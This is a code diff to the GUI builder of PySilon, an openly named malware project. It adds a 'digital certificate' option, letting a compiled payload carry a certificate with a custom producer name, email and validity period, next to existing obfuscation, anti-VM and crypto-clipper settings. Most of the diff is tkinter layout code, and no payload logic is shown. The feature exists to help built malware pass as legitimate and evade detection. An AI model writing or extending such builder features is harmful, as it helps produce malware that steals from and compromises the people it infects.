@@ -4,7 +4,6 @@ from tkinter import filedialog
 import random
 import os
 import pyperclip
-import pyautogui
 import time
 import sys
 import ctypes
@@ -110,6 +109,19 @@ class Builder:
                 'ProcessesCheck': True,
                 'HardwareIDsCheck': True,
                 'MacAddressesCheck': True
+            },
+            'digital_certificate': {
+                'enabled': True,
+                'email_address': 'contact@pysilon.net',
+                'producer_name': 'PySilon Malware',
+                'country_name': 'NT',
+                'locality_name': '',
+                'state_or_province_name': '',
+                'organization_name': '',
+                'organization_unit_name': '',
+                'serial_number': 0,
+                'validity_start_in_seconds': 0,
+                'validity_end_in_seconds': 60*60*24*365
             },
             'debug_mode': False,
             'crypto_clipper': {
@@ -348,6 +360,7 @@ class Builder:
         posx = self.master.winfo_x()
         posy = self.master.winfo_y()+60
         self.imgg = ImageGrab.grab(bbox=(posx, posy, posx+700, posy+460))
+
         self.imgg = ImageTk.PhotoImage(self.imgg)
         self.canvas.create_image(0, 0, image=self.imgg, anchor=tk.NW)
 
@@ -521,6 +534,10 @@ class Builder:
                 self.malware_configuration['obfuscation']['enabled'] = self.cbvar_obfuscation.get()
                 self.malware_configuration['anti_vm']['enabled'] = self.cbvar_antivm.get()
                 self.malware_configuration['debug_mode'] = self.cbvar_debugmode.get()
+                self.malware_configuration['digital_certificate']['enabled'] = self.cbvar_certificate.get()
+                self.malware_configuration['digital_certificate']['producer_name'] = self.cert_producer_entry.get()
+                self.malware_configuration['digital_certificate']['email_address'] = self.cert_mail_entry.get()
+                self.malware_configuration['digital_certificate']['validity_end_in_seconds'] = self.cert_validity_entry.get()
 
         with open('configuration.json' if not temporary else 'resources/assets/configuration.tmp', 'w', encoding='utf-8') as configuration_file:
             configuration_file.write(json.dumps(self.malware_configuration, indent=4))
@@ -593,11 +610,14 @@ class Builder:
         cfg_editor.mainloop()
 
     def double_click_settings(self, context):
+        if context == 'certificate': self.toggle_certificate()
         if time.time() - self.time_check < 0.5:
             if context == 'antivm':
-                self.configuration_editor('resources/assets/configuration.tmp', ['75.0', '79.0'], '76.0')
+                self.configuration_editor('resources/assets/configuration.tmp', ['75.0', '79.0'], '73.0')
             elif context == 'obfuscation':
                 self.configuration_editor('resources/assets/configuration.tmp', ['34.0', '71.0'], '32.0')
+            elif context == 'certificate':
+                self.configuration_editor('resources/assets/configuration.tmp', ['82.0', '92.0'], '80.0')
         self.time_check = time.time()
 
     def open_pysilon(self):
@@ -605,10 +625,10 @@ class Builder:
 
     def open_pysilon_github(self):
         os.system('start https://github.com/mategol/PySilon-malware/releases')
-    
+
     def show_tooltip(self, event, tooltip_text):
         self.canvas.delete(self.tooltip_hint)
-        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=0, background="#0A0A10")
+        self.tooltip_label = tk.Label(self.canvas, text=tooltip_text, relief=tk.RIDGE, borderwidth=0, background="#0A0A10", wraplength=700)
         self.tooltip_label.place(
             x=10, 
             y=builder_configuration['window_sizes'][builder_configuration['use_sizes']]['canvas']['tooltips']['pos_y'], 
@@ -634,6 +654,16 @@ class Builder:
         self.icon_photo = tk.PhotoImage(file='icon.png')
         self.icon_button['image'] = self.icon_photo
         self.malware_configuration['icon_path'] = new_icon
+
+    def toggle_certificate(self):
+        if self.cbvar_certificate.get() == 1:
+            self.cert_producer_entry['state'] = tk.NORMAL
+            self.cert_mail_entry['state'] = tk.NORMAL
+            self.cert_validity_entry['state'] = tk.NORMAL
+        else:
+            self.cert_producer_entry['state'] = tk.DISABLED
+            self.cert_mail_entry['state'] = tk.DISABLED
+            self.cert_validity_entry['state'] = tk.DISABLED
 
     def compile(self):
         self.save_configuration(True, from_window=3)
@@ -849,7 +879,7 @@ class Builder:
             builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['entries'][5]['pos_y'],
             window=self.implode_entry, 
             anchor='w')
-            
+
     def functionality_settings(self):
         self.general_settings_button['state'] = tk.NORMAL
         self.general_settings_button['relief'] = 'groove'
@@ -1227,6 +1257,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
+        self.cbvar_obfuscation.set(self.malware_configuration['obfuscation']['enabled'])
         self.cb_obfuscation.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['obfuscation']))
         self.cb_obfuscation.bind("<Leave>", self.hide_tooltip)
         
@@ -1235,7 +1266,6 @@ class Builder:
             builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['checkboxes'][0]['pos_y'], 
             window=self.cb_obfuscation, 
             anchor='w')
-
         self.cbvar_antivm = tk.BooleanVar(value=True)
         self.cb_antivm = tk.Checkbutton(
             self.canvas,
@@ -1249,6 +1279,7 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
+        self.cbvar_antivm.set(self.malware_configuration['anti_vm']['enabled'])
         self.cb_antivm.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['anti_vm']))
         self.cb_antivm.bind("<Leave>", self.hide_tooltip)
 
@@ -1257,7 +1288,6 @@ class Builder:
             builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['checkboxes'][1]['pos_y'],
             window=self.cb_antivm, 
             anchor='w')
-
         self.cbvar_debugmode = tk.BooleanVar(value=False)
         self.cb_debugmode = tk.Checkbutton(
             self.canvas,
@@ -1270,35 +1300,140 @@ class Builder:
             onvalue=True,
             offvalue=False
         )
+        self.cbvar_debugmode.set(self.malware_configuration['debug_mode'])
         self.cb_debugmode.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['debugmode']))
         self.cb_debugmode.bind("<Leave>", self.hide_tooltip)
-
         self.canvas.create_window(
             100,
-            205,
+            155,
             window=self.cb_debugmode, 
             anchor='w')
 
         self.canvas.create_text(
-            400,
-            125,
+            100,
+            205,
             text='Icon:', 
             fill='white', 
             font=(
                 'Consolas', 
                 builder_configuration['window_sizes'][builder_configuration['use_sizes']]['general_settings']['font_size']), 
-            anchor=tk.W)
-        
-        self.icon_photo = ImageTk.PhotoImage(Image.open('resources/icons/default_icon.png').resize((100, 100)))
+            anchor=tk.W)   
+        self.icon_photo = ImageTk.PhotoImage(Image.open(self.malware_configuration['icon_path']).resize((100, 100)))
         self.icon_button = tk.Button(self.canvas, relief='flat', cursor='hand2', image=self.icon_photo, state=tk.NORMAL, width=100, height=100, command=self.change_icon)
         self.icon_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['icon']))
         self.icon_button.bind("<Leave>", self.hide_tooltip)
         self.canvas.create_window(
-            400,
-            140,
+            100,
+            220,
             window=self.icon_button,
             anchor='nw')
         
+        self.cbvar_certificate = tk.BooleanVar(value=True)
+        self.cb_certificate = tk.Checkbutton(
+            self.canvas,
+            selectcolor='#0A0A10',
+            text='digital certificate',
+            font=(
+                'Consolas', 
+                builder_configuration['window_sizes'][builder_configuration['use_sizes']]['compiling_settings']['font_size']),
+            variable=self.cbvar_certificate,
+            command=lambda:self.double_click_settings('certificate'),
+            onvalue=True,
+            offvalue=False
+        )
+        self.cbvar_certificate.set(self.malware_configuration['digital_certificate']['enabled'])
+        self.cb_certificate.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate']))
+        self.cb_certificate.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(
+            350, 
+            75,
+            window=self.cb_certificate, 
+            anchor='w')
+
+        self.canvas.create_text(
+            375, 
+            100, 
+            text='Producer Name:', 
+            fill='white', 
+            font=(
+                'Consolas', 
+                10), 
+            anchor='w')
+        self.cert_producer_entry = tk.Entry(
+            self.canvas, 
+            font=tkFont.Font(
+                family='Consolas', 
+                size=14), 
+            disabledbackground='#000000',
+            width=20)
+        self.cert_producer_entry.insert(0, self.malware_configuration['digital_certificate']['producer_name'])
+        self.cert_producer_entry['state'] = tk.NORMAL if self.malware_configuration['digital_certificate']['enabled'] else tk.DISABLED
+        self.cert_producer_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate_producername']))
+        self.cert_producer_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(
+            375, 
+            120, 
+            window=self.cert_producer_entry, 
+            anchor='w')
+
+        self.canvas.create_text(
+            375, 
+            150, 
+            text='e-Mail Address:', 
+            fill='white', 
+            font=(
+                'Consolas', 
+                10), 
+            anchor='w')    
+        self.cert_mail_entry = tk.Entry(
+            self.canvas, 
+            font=tkFont.Font(
+                family='Consolas', 
+                size=14), 
+            disabledbackground='#000000',
+            width=20)
+        self.cert_mail_entry.insert(0, self.malware_configuration['digital_certificate']['email_address'])
+        self.cert_mail_entry['state'] = tk.NORMAL if self.malware_configuration['digital_certificate']['enabled'] else tk.DISABLED
+        self.cert_mail_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate_email']))
+        self.cert_mail_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(
+            375, 
+            170, 
+            window=self.cert_mail_entry, 
+            anchor='w')
+
+        self.canvas.create_text(
+            375, 
+            200, 
+            text='Validity in seconds:',
+            fill='white', 
+            font=(
+                'Consolas', 
+                10), 
+            anchor='w')
+        self.cert_validity_entry = tk.Entry(
+            self.canvas, 
+            font=tkFont.Font(
+                family='Consolas', 
+                size=14), 
+            disabledbackground='#000000',
+            width=20)
+        self.cert_validity_entry.insert(0, self.malware_configuration['digital_certificate']['validity_end_in_seconds'])
+        self.cert_validity_entry['state'] = tk.NORMAL if self.malware_configuration['digital_certificate']['enabled'] else tk.DISABLED
+        self.cert_validity_entry.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['certificate_validity']))
+        self.cert_validity_entry.bind("<Leave>", self.hide_tooltip)
+        self.canvas.create_window(
+            375, 
+            220, 
+            window=self.cert_validity_entry, 
+            anchor='w')
+
+
+
+
+
+
+
         self.compile_button = tk.Button(self.canvas, cursor='hand2', text='Compile', font='Consolas', state=tk.NORMAL, command=self.compile)
         self.compile_button.bind("<Enter>", lambda event: self.show_tooltip(event, builder_configuration['tooltips']['compile']))
         self.compile_button.bind("<Leave>", self.hide_tooltip)
